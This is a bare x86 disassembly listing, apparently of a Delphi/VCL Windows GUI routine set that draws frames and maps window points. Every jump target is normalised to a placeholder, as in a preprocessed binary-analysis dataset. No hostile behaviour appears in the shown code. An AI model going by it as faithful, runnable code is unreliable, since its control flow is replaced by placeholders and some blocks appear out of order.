mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_43ecac
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_43d990
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_43f030
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_43d990
mov eax [ esi + 0x64 ]
call sub_43d5dc
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_43f164
xor edx edx
mov eax esi
call sub_43d990
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_43d604
adc edx 0x0
mov eax ebx
call sub_43d2c4
mov eax ebx
call sub_43d654
push esi
push sub_43f164
xor edx edx
mov eax esi
call sub_43d990
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_43dde4
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_43d2c4
mov eax [ ebx + 0x14 ]
call sub_43d654
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_43de5c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_43d5dc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_43d5dc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_43d5dc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_43d1a8
mov esi eax
mov edx 0x2
mov eax ebx
call sub_43d1a8
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_43d5dc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_43d6b4
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_43d6dc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43d6b4
call sub_43de5c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43d6dc
call sub_43de5c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_43d214
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_43d214
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_43e088
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_437fc0
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_437f84
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_412598
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e11c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_43e088
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_43d6dc
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43d928
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_43d6dc
call sub_43de5c
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_43e1a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403eb4
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_404500
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_43e1ec
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43e3e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_43e8bc
mov eax [ ebp - 0x8 ]
call sub_43d8b8
xor edx edx
push ebp
push sub_43e3c7
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e3ce
mov eax [ ebp - 0x8 ]
call sub_43d8bc
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d090
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_43e1a4
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_4032f4
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_43d3b0
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_43e1a4
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_4349b0
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_4357a8
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_4030f8
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_43e3f4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_4125c0
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41dbbc
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e44c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41d214
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_41d970
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_41d910
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_41d910
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41d214
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_41d910
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41d910
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_43e4d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_43e3f4
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_43e44c
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_43e44c
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_43e3f4
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_43e44c
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_43e44c
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_43e5b0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d644
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43e706
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43366c
mov eax [ ebp - 0x4 ]
call sub_41d948
xor eax eax
push ebp
push sub_43e6e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41dc3c
xor eax eax
push ebp
push sub_43e6cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_437fc0
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e6d3
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41dc3c
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_437f84
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_434430
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_43e714
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_439dc0
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_4344d8
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_434494
mov ecx eax
xor edx edx
xor eax eax
call sub_4125c0
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_43b290
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4125e8
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_43e888
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_43e888
pop ecx
mov eax ebx
call sub_4030f8
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_43e888
pop ecx
sub_43e8bc
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_43e888
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_4030f8
xor eax eax
mov [ esi + 0x64 ] eax
sub_43e918
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43d928
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_43e954
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43e954
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43ebc1
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b4
mov edx [ ebp - 0x8 ]
pop eax
call sub_40417c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov eax [ ebx + 0x14 ]
call sub_43d0b4
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b4
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059b4
mov edx [ ebp - 0x10 ]
pop eax
call sub_40417c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_4030f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ebc8
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403ed8
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_43d464
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_43d5dc
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_43d618
mov eax [ ebx + 0x18 ]
call sub_43d464
mov [ edx + 0x18 ] eax
push esi
push sub_43f164
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_43d990
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_43d618
mov eax [ esi + 0x64 ]
call sub_43d5dc
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_4030f8
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_43f13c
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_4030f8
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_43d160
mov edx eax
mov eax edi
call sub_43d604
mov eax edi
call sub_43d464
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_43f164
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_43d990
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
